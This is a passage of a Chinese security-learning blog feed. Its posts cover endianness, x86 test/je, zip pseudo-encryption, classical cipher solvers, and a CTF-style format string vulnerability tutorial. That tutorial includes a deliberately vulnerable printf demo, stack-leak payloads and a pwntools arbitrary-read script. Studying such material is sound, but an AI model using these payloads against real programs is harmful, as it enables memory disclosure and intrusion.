    <content type="html"><![CDATA[<p>端模式（Endian）的这个词出自Jonathan Swift书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，从圆头开始将鸡蛋敲开的人被归为Big Endian，从尖头开始将鸡蛋敲开的人被归为Littile Endian。anny Cohen一位网络协议的开创者，第一次使用这两个术语指代字节顺序，后来就被大家广泛接受。</p><h5 id="小端：较高的有效字节存放在较高的的存储器地址，较低的有效字节存放在较低的存储器地址。"><a href="#小端：较高的有效字节存放在较高的的存储器地址，较低的有效字节存放在较低的存储器地址。" class="headerlink" title="小端：较高的有效字节存放在较高的的存储器地址，较低的有效字节存放在较低的存储器地址。"></a>小端：较高的有效字节存放在较高的的存储器地址，较低的有效字节存放在较低的存储器地址。</h5><h5 id="大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。"><a href="#大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。" class="headerlink" title="大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。"></a>大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。</h5><p>例如<br>对于0x12345678的存储：</p><p>小端模式：（从低字节到高字节）<br>地位地址 0x78 0x56 0x34 0x12 高位地址</p><p>大端模式：（从高字节到低字节）<br>地位地址 0x12 0x34 0x56 0x78 高位地址</p><p>假设从内存地址 0x0000 开始有以下数据：<br>0x0000         0x0001       0x0002       0x0003<br>0x12            0x34           0xab           0xcd<br>如果我们去读取一个地址为 0x0000 的四个字节变量，若字节序为大端模式，则读出结果为0x1234abcd；若字节序为小端模式，则读出结果为0xcdab3412。</p><p>如果我们将0x1234abcd 写入到以 0x0000 开始的内存中，则Little endian 和 Big endian 模式的存放结果如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址           0x0000         0x0001        0x0002          0x0003 </span><br><span class="line">大端：   0x12           0x34            0xab            0xcd  </span><br><span class="line">小端：  0xcd           0xab            0x34            0x12</span><br></pre></td></tr></table></figure><p>一般来说，x86 系列 CPU 都是 little-endian 的字节序，PowerPC 通常是 big-endian，网络字节顺序也是 big-endian。还有的CPU 能通过跳线来设置 CPU 工作于 Little endian 还是 Big endian 模式</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;端模式（Endian）的这个词出自Jonathan Swift书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，从圆头开始将鸡蛋敲开的人被归为Big Endian，从尖头开始将鸡蛋敲开的人被归为Littile Endian。anny Cohen一位网络
      
    
    </summary>
    
    
      <category term="组成原理" scheme="https://kevens10.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="C语言" scheme="https://kevens10.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串</title>
    <link href="https://kevens10.github.io/articles/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2.html"/>
    <id>https://kevens10.github.io/articles/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2.html</id>
    <published>2019-10-30T10:19:52.000Z</published>
    <updated>2019-10-30T11:38:35.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-格式化字符串介绍"><a href="#0x00-格式化字符串介绍" class="headerlink" title="0x00 格式化字符串介绍"></a>0x00 格式化字符串介绍</h2><p>c语言都知道printf，fprintf，sprintf,snprintf等这一类类printf函数中经常会用到“%”后面加一个或多个字符做说明符，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">printf(&quot;My name is %s&quot;,&quot;Van&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后：</p><pre><code>My name is Van</code></pre><p>printf函数的第一个参数就是格式化字符串，它主要是依靠一个用来告诉程序如何进行格式化输出的说明符。在C程序中我们有许多用来格式化字符串的说明符，在这些说明符后面我们可以填充我们的内容。说明符的前缀是“%”字符,以下是几个常见的说明符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%order$s   第order个参数的位置   eg:%5$s</span><br><span class="line"></span><br><span class="line">%s  从内存中读取数据</span><br><span class="line"></span><br><span class="line">%x  输出十六进制数</span><br><span class="line"></span><br><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br><span class="line"></span><br><span class="line">其他都是用来打印的，而%n可以用来把一个int型的值写到指定的地址中。</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>想让用户输入一个名字，然后再把这个名字原样输出，正常情况下这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(&quot;%s&quot;,str);</span><br></pre></td></tr></table></figure><p>这个程序没有问题。<br>如果写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure><p>这个程序在printf处省略了格式化字符串参数，在这里造成了严重的格式化字符串漏洞。<br>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p>demo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char a[100];</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设我们的输入为:</p><pre><code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code></pre><p>程序的输出依次为：<br>                AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825</p><p>注意，这其中有一组为41414141，那就是这个字符串开始的位置。</p><p>看一下栈里的样子：</p><pre><code>0061FE30   0061FE4C  |format =     &quot;AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x&quot;0061FE34   0061FE4C  |&lt;%x&gt; = 0x61FE4C0061FE38   0061FFCC  |&lt;%x&gt; = 0x61FFCC0061FE3C   76E4D250  |&lt;%x&gt; = 0x76E4D2500061FE40   FF12BE58  |&lt;%x&gt; = 0xFF12BE580061FE44   FFFFFFFE  |&lt;%x&gt; = 0xFFFFFFFE0061FE48   76E473DA  |&lt;%x&gt; = 0x76E473DA0061FE4C   41414141  |&lt;%x&gt; = 0x414141410061FE50   252C7825  |&lt;%x&gt; = 0x252C78250061FE54   78252C78  |&lt;%x&gt; = 0x78252C780061FE58   2C78252C  |&lt;%x&gt; = 0x2C78252C0061FE5C   252C7825  \&lt;%x&gt; = 0x252C78250061FE60   78252C780061FE64   2C78252C0061FE68   252C78250061FE6C   78252C780061FE70   000000000061FE74   000000000061FE78   00000000</code></pre><p>0x0061FE4C 是格式化字符串开始的位置，通过不断的取变量操作，最终我们就能读取到程序的每一个位置。</p><h2 id="0x02-实现任意地址读"><a href="#0x02-实现任意地址读" class="headerlink" title="0x02 实现任意地址读"></a>0x02 实现任意地址读</h2><p>任意地址读我们需要用到printf格式化字符串的另外一个特性，”$“操作符。<br>这个操作符可以输出指定位置的参数。</p><pre><code>#include &lt;stdio.h&gt;int main(void){    char str[100];    scanf(&quot;%s&quot;,str);    printf(str);    return 0;}</code></pre><p>首先测出字符串开头的偏移量：</p><pre><code>veritas@ubuntu:~/pwn$ ./strAAAA%1$xAAAAffa87a68veritas@ubuntu:~/pwn$ ./strAAAA%2$x        AAAAc2veritas@ubuntu:~/pwn$ ./strAAAA%3$xAAAAf766376bveritas@ubuntu:~/pwn$ ./strAAAA%4$xAAAAffb6ad4everitas@ubuntu:~/pwn$ ./strAAAA%5$xAAAAffab456cveritas@ubuntu:~/pwn$ ./strAAAA%6$x    AAAA41414141</code></pre><p>由此我们测出偏移为6<br>然后我们用pwntools编写如下脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">cn = process(&apos;str&apos;)</span><br><span class="line">cn.sendline(p32(0x08048000)+&quot;%6$s&quot;)</span><br><span class="line">#cn.sendline(&quot;%7$s&quot;+p32(0x08048000))</span><br><span class="line">print cn.recv()</span><br></pre></td></tr></table></figure><p>（未完待续）<br>参考资料：<a href="https://veritas501.github.io/2017/04/28/格式化字符串漏洞学习/" target="_blank" rel="noopener">https://veritas501.github.io/2017/04/28/格式化字符串漏洞学习/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-格式化字符串介绍&quot;&gt;&lt;a href=&quot;#0x00-格式化字符串介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 格式化字符串介绍&quot;&gt;&lt;/a&gt;0x00 格式化字符串介绍&lt;/h2&gt;&lt;p&gt;c语言都知道printf，fprintf，sprin
      
    
    </summary>
    
    
      <category term="PWN" scheme="https://kevens10.github.io/categories/PWN/"/>
    
    
      <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
    
      <category term="二进制漏洞" scheme="https://kevens10.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="格式化字符串漏洞" scheme="https://kevens10.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>test与je指令组合用法</title>
    <link href="https://kevens10.github.io/articles/test%E4%B8%8Eje%E6%8C%87%E4%BB%A4%E7%BB%84%E5%90%88%E7%94%A8%E6%B3%95.html"/>
    <id>https://kevens10.github.io/articles/test%E4%B8%8Eje%E6%8C%87%E4%BB%A4%E7%BB%84%E5%90%88%E7%94%A8%E6%B3%95.html</id>
    <published>2019-10-23T12:19:09.000Z</published>
    <updated>2019-10-23T12:55:35.783Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-指令介绍"><a href="#0x00-指令介绍" class="headerlink" title="0x00 指令介绍"></a>0x00 指令介绍</h2><p>test 指令用于两个操作数的按位AND运算，并根据结果设置标志寄存器，结果本身不会写回到目的操作数。<br>要点：</p><pre><code>1. AND 运算结果为0时， ZF(zero flag)置位；2. test可以影响CF，OF，PF，SF，ZF标志位；3. 两个操作数相等，同时为0时，AND 结果为0， 此时ZF置位。</code></pre><p>je 指令【Jump if Equals】在ZF被置位时跳转。je 是 jz 【Jump if Zero】的别名</p><h2 id="0x01-test-和-je-连用"><a href="#0x01-test-和-je-连用" class="headerlink" title="0x01 test 和 je 连用"></a>0x01 test 和 je 连用</h2><pre><code>TEST EAX,EAX JE some_address </code></pre><p> 这段代码的含义是：</p><p>如果eax==0的话就跳转到”some_address”。</p><p>运算过程：</p><p>CPU只在 ZF = 1的时候跳转，因此，需要让AND(EAX, EAX) = 0 。而什么时候这个运算为0呢？上文已经提过了，就是EAX = 0的时候。隐含条件是test的两个运算数相等，都为EAX。</p><p>等价C代码：</p><pre><code>if(eax == 0){    goto some_address}</code></pre><h2 id="0x02-应用举例"><a href="#0x02-应用举例" class="headerlink" title="0x02 应用举例"></a>0x02 应用举例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Conditional Jump</span><br><span class="line">test cl, cl   ; set ZF to 1 if cl == 0</span><br><span class="line">je 0x804f430  ; jump if ZF == 1</span><br><span class="line"></span><br><span class="line">; or</span><br><span class="line">test eax, eax  ; set SF to 1 if eax &lt; 0 (negative)</span><br><span class="line">js error ; jump if SF == 1</span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax" target="_blank" rel="noopener">https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax</a><br><a href="https://en.wikipedia.org/wiki/TEST_(x86_instruction)" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/TEST_(x86_instruction)</a><br><a href="https://blog.csdn.net/zz709196484/article/details/77755243" target="_blank" rel="noopener">https://blog.csdn.net/zz709196484/article/details/77755243</a><br><a href="https://blog.csdn.net/ms2146/article/details/5279442" target="_blank" rel="noopener">https://blog.csdn.net/ms2146/article/details/5279442</a><br>转载自<a href="https://blog.csdn.net/counsellor/article/details/81005101，遵循" target="_blank" rel="noopener">https://blog.csdn.net/counsellor/article/details/81005101，遵循</a> CC 4.0 BY-SA 版权协议</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-指令介绍&quot;&gt;&lt;a href=&quot;#0x00-指令介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 指令介绍&quot;&gt;&lt;/a&gt;0x00 指令介绍&lt;/h2&gt;&lt;p&gt;test 指令用于两个操作数的按位AND运算，并根据结果设置标志寄存器，结果本身不会
      
    
    </summary>
    
    
      <category term="汇编" scheme="https://kevens10.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="CTF 逆向" scheme="https://kevens10.github.io/tags/CTF-%E9%80%86%E5%90%91/"/>
    
      <category term="汇编语言" scheme="https://kevens10.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>zip伪加密</title>
    <link href="https://kevens10.github.io/articles/%E4%BC%AA%E5%8A%A0%E5%AF%86.html"/>
    <id>https://kevens10.github.io/articles/%E4%BC%AA%E5%8A%A0%E5%AF%86.html</id>
    <published>2019-10-23T11:53:49.000Z</published>
    <updated>2019-10-23T12:11:53.167Z</updated>
    
    <content type="html"><![CDATA[<h2 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h2><p>一个 ZIP<br>文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><h2 id="伪加密原理"><a href="#伪加密原理" class="headerlink" title="伪加密原理"></a>伪加密原理</h2><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</p><h2 id="判断是否为伪加密"><a href="#判断是否为伪加密" class="headerlink" title="判断是否为伪加密"></a>判断是否为伪加密</h2><h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p><strong>压缩源文件数据区的全局加密应当为00 00</strong></p><p><strong>且压缩源文件目录区的全局方式位标记应当为00 00</strong></p><h3 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h3><p><strong>压缩源文件数据区的全局加密应当为00 00</strong></p><p><strong>且压缩源文件目录区的全局方式位标记应当为09 00</strong></p><h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p><strong>压缩源文件数据区的全局加密应当为09 00</strong></p><p><strong>且压缩源文件目录区的全局方式位标记应当为09 00</strong></p><h2 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h2><p>winhex打开zip文件。</p><p>把504B0304后的第3、4个byte改成0000还有</p><p>把504B0102后的第5、6个byte改成0000即可破解伪加密。<br><img src="/images/weijiami2.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;zip文件组成&quot;&gt;&lt;a href=&quot;#zip文件组成&quot; class=&quot;headerlink&quot; title=&quot;zip文件组成&quot;&gt;&lt;/a&gt;zip文件组成&lt;/h2&gt;&lt;p&gt;一个 ZIP&lt;br&gt;文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。
      
    
    </summary>
    
    
      <category term="安全杂项" scheme="https://kevens10.github.io/categories/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="CTF 安全杂项" scheme="https://kevens10.github.io/tags/CTF-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
      <category term="文件结构" scheme="https://kevens10.github.io/tags/%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>常见的古典密码与常用脚本</title>
    <link href="https://kevens10.github.io/articles/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC.html"/>
    <id>https://kevens10.github.io/articles/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC.html</id>
    <published>2019-10-23T10:57:11.000Z</published>
    <updated>2019-10-23T11:16:22.559Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">a = open(r&apos;crypto4.txt&apos;,&apos;r&apos;)</span><br><span class="line">ciphertext = a.read()</span><br><span class="line">b = len(ciphertext)</span><br><span class="line"></span><br><span class="line">print(&apos;The ciphertext :&apos;,ciphertext)</span><br><span class="line">print(&apos;The length of ciphertext is&apos;,b)</span><br><span class="line"></span><br><span class="line">#将字符串转化为数组形式</span><br><span class="line">ciphertext = [ciphertext[i:i+1] for i in range(0,b,1)]</span><br><span class="line"></span><br><span class="line">#获取可以解密的栅栏数</span><br><span class="line">c =[]</span><br><span class="line">num = 1</span><br><span class="line">while num &lt;= b:</span><br><span class="line">    if b%num == 0:</span><br><span class="line">        c.append(num)</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    num += 1</span><br><span class="line">print(&apos;每栏个数可为:&apos;,c)</span><br><span class="line">#将密文按照栅栏数进行分组</span><br><span class="line">for step in c:</span><br><span class="line">    d = [ciphertext[i:i+step] for i in range(0,b,step)]</span><br><span class="line">    flag = &apos;&apos;</span><br><span class="line">    for i in range(step):</span><br><span class="line">        for x in d:</span><br><span class="line">            e = x[i]</span><br><span class="line">            flag += e</span><br><span class="line">    print(&apos;解密时每栏个数:&apos;,step,&apos;\n&apos;,d,&apos;\n&apos;,&apos;result:&apos;,flag)</span><br></pre></td></tr></table></figure><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">#密文转化为指定格式</span><br><span class="line">s = &apos;AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA&apos;</span><br><span class="line">a = s.lower()</span><br><span class="line"></span><br><span class="line">#字典</span><br><span class="line">CODE_TABLE = &#123;</span><br><span class="line">    &apos;a&apos;:&apos;aaaaa&apos;,&apos;b&apos;:&apos;aaaab&apos;,&apos;c&apos;:&apos;aaaba&apos;,&apos;d&apos;:&apos;aaabb&apos;,&apos;e&apos;:&apos;aabaa&apos;,&apos;f&apos;:&apos;aabab&apos;,&apos;g&apos;:&apos;aabba&apos;,</span><br><span class="line">    &apos;h&apos;:&apos;aabbb&apos;,&apos;i&apos;:&apos;abaaa&apos;,&apos;j&apos;:&apos;abaab&apos;,&apos;k&apos;:&apos;ababa&apos;,&apos;l&apos;:&apos;ababb&apos;,&apos;m&apos;:&apos;abbaa&apos;,&apos;n&apos;:&apos;abbab&apos;,</span><br><span class="line">    &apos;o&apos;:&apos;abbba&apos;,&apos;p&apos;:&apos;abbbb&apos;,&apos;q&apos;:&apos;baaaa&apos;,&apos;r&apos;:&apos;baaab&apos;,&apos;s&apos;:&apos;baaba&apos;,&apos;t&apos;:&apos;baabb&apos;,&apos;u&apos;:&apos;babaa&apos;,</span><br><span class="line">    &apos;v&apos;:&apos;babab&apos;,&apos;w&apos;:&apos;babba&apos;,&apos;x&apos;:&apos;babbb&apos;,&apos;y&apos;:&apos;bbaaa&apos;,&apos;z&apos;:&apos;bbaab&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#5个一组进行切割并解密</span><br><span class="line">def peigendecode(peigen):</span><br><span class="line">    msg =&apos;&apos;</span><br><span class="line">    codes = re.findall(r&apos;.&#123;5&#125;&apos;, a)</span><br><span class="line">    for code in codes:</span><br><span class="line">        if code ==&apos;&apos;:</span><br><span class="line">            msg += &apos; &apos;</span><br><span class="line">        else:</span><br><span class="line">            UNCODE =dict(map(lambda t:(t[1],t[0]),CODE_TABLE.items()))</span><br><span class="line">            msg += UNCODE[code]</span><br><span class="line">    return msg</span><br><span class="line"></span><br><span class="line">flag = peigendecode(a)</span><br><span class="line">print(&apos;flag is &apos;,flag)</span><br></pre></td></tr></table></figure><h2 id="轮转机密码"><a href="#轮转机密码" class="headerlink" title="轮转机密码"></a>轮转机密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import re </span><br><span class="line">sss=&apos;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt; &apos;</span><br><span class="line">m=&quot;NFQKSEVOQOFNP&quot; </span><br><span class="line">content=re.findall(r&apos;&lt; (.*?) &lt;&apos;,sss,re.S) </span><br><span class="line">iv=[2,3,7,5,13,12,9,1,8,10,4,11,6] </span><br><span class="line">vvv=[] </span><br><span class="line">ans=&quot;&quot; </span><br><span class="line">for i in range(13): </span><br><span class="line">index=content[iv[i]-1].index(m[i]) </span><br><span class="line">vvv.append(index)</span><br><span class="line"></span><br><span class="line">for i in range(0,26): </span><br><span class="line">flag=&quot;&quot; </span><br><span class="line">for j in range(13): </span><br><span class="line">flag+=content[iv[j]-1][(vvv[j]+i)%26] </span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"># a,b为y=ax+b的系数</span><br><span class="line"># y = 17*x-8 flag&#123;szzyfimhyzd&#125;   答案格式：flag&#123;********&#125;</span><br><span class="line"># Crypto为密文，res为明文，暴力破解得到，不用求取逆元</span><br><span class="line">import string</span><br><span class="line">crypto = &quot;szzyfimhyzd&quot;</span><br><span class="line">a = 17</span><br><span class="line">b = -8</span><br><span class="line">word = string.ascii_lowercase</span><br><span class="line"># print word</span><br><span class="line">res = &apos;&apos;</span><br><span class="line">for c in crypto:</span><br><span class="line">for w in word:</span><br><span class="line">if ord(c)-97 == ((ord(w)-97)*a + b)%26:</span><br><span class="line">res += w</span><br><span class="line">print res</span><br><span class="line"># affineshift</span><br></pre></td></tr></table></figure><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 